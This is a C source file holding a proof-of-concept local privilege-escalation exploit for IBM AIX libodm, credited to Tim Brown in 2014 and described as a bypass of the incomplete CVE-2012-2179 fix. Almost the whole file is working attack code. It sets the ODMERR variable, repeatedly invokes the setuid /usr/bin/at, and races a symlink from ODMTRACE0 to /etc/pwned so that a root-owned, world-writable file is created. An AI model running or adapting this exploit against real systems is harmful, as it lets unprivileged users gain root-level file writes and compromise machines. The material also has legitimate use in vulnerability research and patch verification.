/*
Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.
* Neither the name of the Nth Dimension nor the names of its contributors may
be used to endorse or promote products derived from this software without
specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

(c) Tim Brown, 2014
<mailto:timb@nth-dimension.org.uk>
<http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>

PoC exploit for IBM AIX libodm ODMERR environment variable privesc.

This was originally fixed under CVE-2012-2179 however the initial patch
simply turned it from a direct symlink attack to a raceable symlink attack.

Greetz to Jakub Wartak for beating me to reporting the original bug, I
hope you enjoy this bug fix to the original exploit :)
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
	int pwnedflag;
	printf("PoC exploit for IBM AIX libodm ODMERR environment variable privesc.\r\n");
	printf("(c) Tim Brown, 2014\r\n");
	printf("<mailto:timb@nth-dimension.org.uk>\r\n");
	printf("<http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>\r\n");
	printf("Race started...\r\n");
	pwnedflag = 0;
	umask(0);
	if (fork()) {
		setenv("ODMERR", "1", 1);
		while (!pwnedflag) {
			if (!access("/etc/pwned", F_OK)) {
				pwnedflag = 1;
				printf("Race won...\r\n");
				unsetenv("ODMERR");
				exit(EXIT_SUCCESS);
			}
			system("/usr/bin/at");
		}
	} else {
		while (!pwnedflag) {
			symlink("/etc/pwned", "ODMTRACE0");
			if (!access("/etc/pwned", F_OK)) {
				pwnedflag = 1;
				printf("Race won...\r\n");
				exit(EXIT_SUCCESS);
			}
			unlink("ODMTRACE0");
		}
	}
}